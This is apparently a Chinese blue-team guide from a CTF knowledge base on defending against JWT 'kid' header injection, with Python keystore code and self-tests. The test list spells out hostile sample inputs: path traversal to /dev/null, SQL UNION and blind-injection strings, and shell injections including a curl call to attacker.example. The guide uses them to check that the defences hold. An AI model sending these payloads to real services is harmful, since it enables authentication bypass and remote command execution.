---
id: "ctf-website/02-auth/jwt/04-kid-injection-defense"
title: "JWT kid 参数注入防御"
title_en: "JWT kid Parameter Injection Defense"
summary: >
  针对 JWT Header 中 kid（Key ID）参数引起的路径穿越读取 /dev/null 或系统文件充当空/已知密钥、SQL 注入（UNION/盲注）篡改返回密钥、Shell 命令注入以及多租户 kid 越权切换攻击，提供内存静态 KeyStore 精确查表、kid 格式正则白名单、SQL 参数化查询与租户隔离策略，并附可运行的 Python 防护测试脚本。
summary_en: >
  Defensive guide against JWT Header kid injection covering path traversal (/dev/null empty-key abuse), SQL injection (UNION/blind), OS command execution, and cross-tenant key switching. Enforces in-memory static keystore lookup, strict regex validation, parameterized queries, and runnable Python tests.
board: "ctf-website"
category: "02-auth"
signals: ["kid", "Key ID", "路径穿越防御", "SQL参数化", "命令注入防御", "KeyStore", "多租户隔离"]
mcp_tools: ["kb_router", "kb_read_file", "kb_catalog"]
keywords: ["JWT kid防御", "kid注入修复", "KeyStore白名单", "路径穿越拦截", "SQL参数化查询"]
difficulty: "advanced"
tags: ["defense", "blue-team", "authentication", "jwt", "injection", "path-traversal"]
language: "zh-CN"
last_updated: "2026-11-12"
related_articles: ["ctf-website/02-auth/jwt/04-kid-injection", "ctf-website/02-auth/jwt/00-overview-defense", "ctf-website/02-auth/jwt/05-jku-x5u-abuse-defense"]
track: "blue"
defends: "ctf-website/02-auth/jwt/04-kid-injection"
---

# JWT `kid` 参数注入防御

`kid`（Key ID）仅应作为**非信任的索引标签**，用于在服务端预加载的受信任密钥集合中查表匹配。一旦代码将 `kid` 直接拼接到文件系统路径、SQL 字符串、外部 URL 或 Shell 命令中，就会瞬间转化为任意文件读取（如 `/dev/null` 归零密钥）、SQL 注入控制 Secret 或远程代码执行。

## 注入路径与防御映射

| 攻击向量 | 漏洞根因 | 强制防御控制 |
|---|---|---|
| 路径穿越 (`../../dev/null`, `%2e%2e/`) | `open(f"/etc/jwt_keys/{kid}.pem")` 未做路径归一化与白名单检查 | **严禁按 `kid` 动态读盘**：启动时预加载密钥目录到内存 `dict[kid, Key]`；若必须查文件，校验 `kid` 仅匹配 `^[a-zA-Z0-9_-]{1,64}$` 且解析后路径位于基目录内且文件非空 |
| SQL 注入 (`' UNION SELECT 'mykey'--`) | 使用 f-string 拼接 SQL：`WHERE kid = '{kid}'` | 严格先用正则白名单过滤 `kid`，数据库查询必须使用参数化占位符（`?` / `%s` / `:kid`），并校验返回密钥长度 >= 32 字节 |
| Shell 命令注入 (`;curl ...`, `$(id)`) | 通过 `subprocess` / `shell=True` 拼接 `kid` 调用 `curl`/脚本取密钥 | **绝对禁止任何 Shell/子进程调用**；远程 JWKS 获取只用纯内存 HTTP 客户端对接静态配置 URL |
| 租户越权切换 (`kid` 指向低权限租户密钥) | `kid` 查表未绑定当前请求的 `iss` 或租户上下文 | KeyStore 索引采用 `(tenant_id, kid)` 联合键，且验证密钥不与业务输入交叉 |
| 错误分支泄露 / `null`/对象注入 | 抛出 `FileNotFound`、`key too short`、`SQL syntax` 等差异化错误 | 对 `kid` 缺失、非字符串、未命中、验签失败统一返回相同 `401` |

## 防御工作流

```text
1. 类型与字符白名单门禁
   └─ 校验 kid 必须为 str 且严格匹配 ^[a-zA-Z0-9_-]{1,64}$，拒绝 /、\、..、'、"、;、$、`、空值与对象
2. 静态内存 KeyStore 映射（首选模式）
   └─ 服务启动时扫描受控配置加载 {kid: KeyObject} 到只读字典，运行时仅执行 O(1) 字典查找
3. 若必须查询数据库（次选模式）
   └─ 经过第 1 步正则拦截后，使用预编译参数化 SQL 查询，并校验查出的密钥非空且满足最小长度
4. 绑定租户与算法上下文
   └─ 验证查得密钥的允许算法与当前预期算法一致，禁止跨租户或跨算法复用同一 kid
5. 统一拒绝响应
   └─ 无论找不到 key 还是签名无效，统一抛出通用认证失败，禁止返回文件系统路径或 SQL 异常
```

### Python 内存 KeyStore 与安全文件/SQL 查键模板

```python
import re
from pathlib import Path

KID_RE = re.compile(r"^[a-zA-Z0-9_-]{1,64}$")


class KeyLookupError(Exception):
    """统一密钥查询失败异常，避免向外部暴露路径或 SQL 细节。"""


class SafeKeyStore:
    """静态预加载与严格白名单校验相结合的安全密钥存储。"""

    def __init__(self, static_keys: dict[str, bytes]) -> None:
        self._keys: dict[str, bytes] = {}
        for kid, key in static_keys.items():
            if not KID_RE.fullmatch(kid):
                raise ValueError(f"invalid configured kid: {kid}")
            if len(key) < 32:
                raise ValueError(f"configured key for {kid} too short")
            self._keys[kid] = key

    def get_key(self, kid: object) -> bytes:
        if not isinstance(kid, str) or not KID_RE.fullmatch(kid):
            raise KeyLookupError("invalid key identifier")
        key = self._keys.get(kid)
        if key is None:
            raise KeyLookupError("key not found")
        return key


def safe_resolve_key_file(base_dir: Path, kid: object) -> Path:
    """若需映射磁盘目录，双重约束：字符白名单 + resolve() 边界检查 + 禁止空文件/链接。"""
    if not isinstance(kid, str) or not KID_RE.fullmatch(kid):
        raise KeyLookupError("invalid kid format")
    base_resolved = base_dir.resolve()
    candidate = (base_resolved / f"{kid}.pem").resolve()
    if candidate.parent != base_resolved:
        raise KeyLookupError("path escape blocked")
    if candidate.is_symlink() or not candidate.is_file():
        raise KeyLookupError("invalid key file")
    if candidate.stat().st_size < 32:
        raise KeyLookupError("empty or undersized key file rejected")
    return candidate


def safe_sql_lookup(cursor, kid: object, tenant_id: str) -> bytes:
    """参数化 SQL 查询示范，杜绝 UNION / 盲注拼接。"""
    if not isinstance(kid, str) or not KID_RE.fullmatch(kid):
        raise KeyLookupError("invalid kid format")
    cursor.execute(
        "SELECT secret_key FROM jwt_keys WHERE tenant_id = ? AND kid = ? AND active = 1",
        (tenant_id, kid),
    )
    row = cursor.fetchone()
    if not row or not row[0] or len(row[0]) < 32:
        raise KeyLookupError("key unavailable")
    return row[0] if isinstance(row[0], bytes) else str(row[0]).encode("utf-8")
```

## 验证与判定标准

运行以下自检确认 [04-kid-injection.md](../../../../../red/ctf-website/techniques/02-auth/jwt/04-kid-injection.md) 中的路径穿越、SQL 注入、命令注入及对象/空值 `kid` 均被拦截：

```python
import sqlite3
import tempfile


def run_kid_defense_checks() -> None:
    store = SafeKeyStore({"key-2026-01": b"K" * 32})
    assert store.get_key("key-2026-01") == b"K" * 32

    malicious_kids = [
        "../../dev/null",
        "%2e%2e/%2e%2e/dev/null",
        "../../../etc/hostname",
        "x' UNION SELECT 'mykey' --",
        "x' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END) --",
        "x;curl http://attacker.example/pwn;",
        "$(id>/tmp/pwned)",
        "http://127.0.0.1/jwks",
        "",
        None,
        ["missing"],
        {"toString": "missing"},
    ]
    for bad in malicious_kids:
        try:
            store.get_key(bad)
        except KeyLookupError:
            pass
        else:
            raise AssertionError(f"malicious kid accepted by SafeKeyStore: {bad!r}")

    # 测试 SQLite 参数化查键与 Path 边界防护
    conn = sqlite3.connect(":memory:")
    conn.execute("CREATE TABLE jwt_keys (tenant_id TEXT, kid TEXT, secret_key TEXT, active INTEGER)")
    conn.execute("INSERT INTO jwt_keys VALUES (?, ?, ?, 1)", ("t1", "key-2026-01", "Z" * 32))
    assert safe_sql_lookup(conn.cursor(), "key-2026-01", "t1") == b"Z" * 32
    for sqli in ("x' UNION SELECT 'attacker_key' --", "key-2026-01"):
        tenant = "t2" if sqli == "key-2026-01" else "t1"
        try:
            safe_sql_lookup(conn.cursor(), sqli, tenant)
        except KeyLookupError:
            pass
        else:
            raise AssertionError(f"SQLi or cross-tenant lookup succeeded: {sqli}")

    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp)
        (base / "empty.pem").write_bytes(b"")
        (base / "valid-1.pem").write_bytes(b"A" * 64)
        assert safe_resolve_key_file(base, "valid-1").name == "valid-1.pem"
        for bad_file in ("empty", "../../dev/null"):
            try:
                safe_resolve_key_file(base, bad_file)
            except KeyLookupError:
                pass
            else:
                raise AssertionError(f"unsafe file accepted: {bad_file}")

    print("PASS: all kid injection defense checks passed")


if __name__ == "__main__":
    run_kid_defense_checks()
```

判定标准：
1. **非白名单零通过**：任何含 `/`、`\`、`..`、`'`、`;`、`$`、URL 协议或非字符串类型的 `kid` 均在参数校验层立即被拒绝，不触发磁盘 I/O、SQL 或网络外连。
2. **错误完全同源**：输入不存在的 `kid` 与注入 payload 时，HTTP 状态码、错误消息与响应时长无显著差异。
3. **空文件拒绝**：即使密钥目录被异常写入空文件（0 字节），加载逻辑也会拒绝使用其作为签名密钥。

## MCP 工具映射

| 防御阶段 | MCP 工具 | 说明 |
|---|---|---|
| 防御知识定位 | `kb_router` | 按 `kid`、`路径穿越`、`SQL参数化` 搜索相关防御规程 |
| 规程读取 | `kb_read_file` | 读取 `04-kid-injection-defense` 与 `00-overview-defense` |
| 目录索引核查 | `kb_catalog` | 核对 `02-auth/jwt/` 及 `24-database/` 关联防御文件 |
